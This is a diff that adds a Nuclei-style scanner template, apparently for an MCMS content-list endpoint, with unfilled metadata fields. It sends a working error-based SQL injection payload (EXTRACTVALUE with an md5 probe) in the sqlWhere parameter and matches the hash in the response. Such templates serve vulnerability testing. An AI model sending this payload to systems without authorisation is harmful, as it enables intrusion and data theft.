@@ -1,0 +1,26 @@
+id: mcms-list-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /cms/content/list.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate, br
+        Content-Length: 170
+
+        sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(select md5(1)),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b92'
